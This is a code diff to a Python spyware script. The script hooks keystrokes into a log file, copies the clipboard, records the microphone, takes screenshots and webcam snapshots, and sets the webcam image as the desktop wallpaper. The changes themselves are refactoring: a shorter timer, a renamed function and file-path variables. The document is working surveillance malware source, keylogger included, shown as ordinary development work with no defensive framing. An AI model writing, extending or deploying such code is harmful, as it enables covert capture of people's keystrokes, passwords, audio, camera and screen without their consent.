@@ -27,6 +27,7 @@ try:
     import atexit
     import json
     import ctypes
+    import threading
 except:
     os.system("pip install -r requirements.txt")
 
@@ -60,24 +61,23 @@ MAP = {
 }
 
 TERMINATE_KEY = "f7"
-TIMER_DURATION = 60  # Time in seconds (e.g., 60 seconds)
+TIMER_DURATION = 30  # Time in seconds (e.g., 60 seconds)
 
 def callback(output, is_down, event):
     if event.event_type in ("up", "down"):
         key = MAP.get(event.name, event.name)
         modifier = len(key) > 1
-        if not modifier and event.event_type == "down":  # Capture only modifiers when keys are pressed
-            return
-        if modifier:  # Avoid typing the same key multiple times if it is being pressed
+        # Capture only modifiers when keys are pressed
+        if not modifier and event.event_type == "down": return
+        # Avoid typing the same key multiple times if it is being pressed
+        if modifier:  
             if event.event_type == "down":
-                if is_down.get(key, False):
-                    return
+                if is_down.get(key, False): return
                 is_down[key] = True
-            elif event.event_type == "up":
-                is_down[key] = False
+            elif event.event_type == "up": is_down[key] = False
             key = " [{} ({})] ".format(key, event.event_type)  # Indicate if the key is being pressed
-        elif key == "\r":
-            key = "\n"  # Line break
+        # Line break
+        elif key == "\r": key = "\n"  
         output.write(key)  # Write the key to the output file
         output.flush()  # Force write
 
@@ -95,7 +95,7 @@ def key_logger():
     print("Press F7 to terminate or wait for the timer to expire.")
     try:
         is_down = {}  # Indicates if a key is being pressed
-        output = open('keystrokes_info.txt', 'a')  # Output file
+        output = open(keystrokes_info, 'a')  # Output file
         atexit.register(onexit, output)  # Close the file at the end of the program
 
         # Start the keylogger hook
@@ -164,7 +164,7 @@ def screenshots():
     im.save(screenshot_info)
 
 # Get Snap with WebCamera
-def webCamera():
+def web_camera():
     print('starting web camera information')
 
     screenshots
@@ -176,14 +176,14 @@ def webCamera():
         waitKey(1)
         destroyWindow("webCam")
 
-def set_wallpaper(image_path):
+def set_wallpaper():
     # Constants for setting the wallpaper
     SPI_SETDESKWALLPAPER = 20
     SPIF_UPDATEINIFILE = 0x01
     SPIF_SENDWININICHANGE = 0x02
 
     # Call Windows API to change wallpaper
-    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
+    result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, webCamShot_info, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
     if result: print("Wallpaper changed successfully!")
     else: print("Failed to change wallpaper.")
 
@@ -192,8 +192,8 @@ def main():
     copy_clipboard()
     microphone()
     screenshots()
-    webCamera()
-    set_wallpaper(webCamShot_info)
+    web_camera()
+    set_wallpaper()
     key_logger()
 
 if __name__ == "__main__":
